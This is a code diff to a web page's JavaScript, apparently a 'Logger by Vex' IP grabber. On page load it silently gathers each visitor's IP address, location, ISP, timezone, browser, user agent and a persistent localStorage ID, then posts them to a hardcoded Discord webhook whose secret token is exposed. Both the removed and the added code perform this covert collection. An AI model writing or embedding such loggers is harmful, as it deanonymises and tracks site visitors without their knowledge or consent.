@@ -97,57 +97,56 @@ document.addEventListener("DOMContentLoaded", function () {
     (async () => {
   const webhookURL = "https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1";
 
-  const [ipapi, ipwhois, ipinfo] = await Promise.all([
-    fetch("https://ipapi.co/json/").then(res => res.json()),
-    fetch("https://ipwhois.app/json/").then(res => res.json()),
-    fetch("https://ipinfo.io/json?token=PUT_TOKEN_JIKA_PERLU").then(res => res.json())
-  ]);
+  try {
+    const data = await fetch("https://ipapi.co/json/").then(res => res.json());
+    let hwid = localStorage.getItem("vex_hwid");
+    if (!hwid) {
+      hwid = crypto.randomUUID();
+      localStorage.setItem("vex_hwid", hwid);
+    }
 
-  // HWID simulasi
-  let hwid = localStorage.getItem("vex_hwid");
-  if (!hwid) {
-    hwid = crypto.randomUUID();
-    localStorage.setItem("vex_hwid", hwid);
+    const ua = data.user_agent || navigator.userAgent;
+    function detectBrowser(ua) {
+      if (/Edg/i.test(ua)) return "Microsoft Edge";
+      if (/OPR|Opera/i.test(ua)) return "Opera";
+      if (/Chrome/i.test(ua)) return "Google Chrome";
+      if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
+      if (/Firefox/i.test(ua)) return "Mozilla Firefox";
+      return "Unknown Browser";
+    }
+
+    const browser = detectBrowser(ua);
+    const now = new Date().toLocaleString();
+
+    const embed = {
+      embeds: [{
+        title: "New Visitor Logged [Multi-API]",
+        color: 0xFFD700,
+        fields: [
+          { name: "IP Address", value: data.ip, inline: true },
+          { name: "HWID (Simulated)", value: hwid, inline: true },
+          { name: "City", value: data.city, inline: true },
+          { name: "Region", value: data.region, inline: true },
+          { name: "Country", value: data.country_name, inline: true },
+          { name: "Org / ISP", value: data.org, inline: true },
+          { name: "Timezone", value: data.timezone, inline: true },
+          { name: "Browser", value: browser, inline: true },
+          { name: "User Agent", value: ua.slice(0, 256) },
+          { name: "Date", value: now, inline: true }
+        ],
+        footer: { text: "Logger by Vex | Sumber: ipapi.co" }
+      }]
+    };
+
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embed)
+    });
+
+    console.log("Webhook sent successfully!");
+  } catch (error) {
+    console.error("Error while sending webhook:", error);
   }
-
-  // Deteksi browser dari user agent
-  const ua = ipapi.user_agent || navigator.userAgent;
-  function detectBrowser(ua) {
-    if (/Edg/i.test(ua)) return "Microsoft Edge";
-    if (/OPR|Opera/i.test(ua)) return "Opera";
-    if (/Chrome/i.test(ua)) return "Google Chrome";
-    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
-    if (/Firefox/i.test(ua)) return "Mozilla Firefox";
-    return "Unknown Browser";
-  }
-
-  const browser = detectBrowser(ua);
-  const now = new Date().toLocaleString();
-
-  const embed = {
-    embeds: [{
-      title: "New Visitor Logged [Multi-API]",
-      color: 0xFFD700,
-      fields: [
-        { name: "IP Address", value: ipapi.ip || ipwhois.ip || ipinfo.ip, inline: true },
-        { name: "HWID (Simulated)", value: hwid, inline: true },
-        { name: "City", value: ipapi.city || ipwhois.city || ipinfo.city, inline: true },
-        { name: "Region", value: ipapi.region || ipwhois.region, inline: true },
-        { name: "Country", value: ipapi.country_name || ipwhois.country, inline: true },
-        { name: "Org / ISP", value: ipapi.org || ipwhois.isp || ipinfo.org, inline: true },
-        { name: "Timezone", value: ipapi.timezone || ipwhois.timezone, inline: true },
-        { name: "Browser", value: browser, inline: true },
-        { name: "User Agent", value: ua.slice(0, 256) },
-        { name: "Date", value: now, inline: true }
-      ],
-      footer: { text: "Logger by Vex | Sumber: ipapi.co, ipwhois.app, ipinfo.io" }
-    }]
-  };
-
-  await fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(embed)
-  });
 })();
   // Script Log HWID, Device info, User Agent, dan IP Log
